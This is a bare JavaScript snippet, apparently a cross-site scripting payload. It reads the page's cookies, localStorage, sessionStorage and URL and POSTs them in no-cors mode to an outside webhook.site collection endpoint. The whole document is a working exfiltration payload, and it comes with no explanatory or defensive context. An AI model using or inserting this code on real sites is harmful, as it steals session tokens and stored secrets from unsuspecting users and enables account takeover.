(function(){
    var data = {
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        url: window.location.href
    };
    
    if(typeof fetch !== 'undefined'){
        fetch('https://webhook.site/a90fcf0f-218a-46ef-a113-6bc249382768/collect', {
            method: 'POST',
            mode: 'no-cors',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data)
        });
    }
})();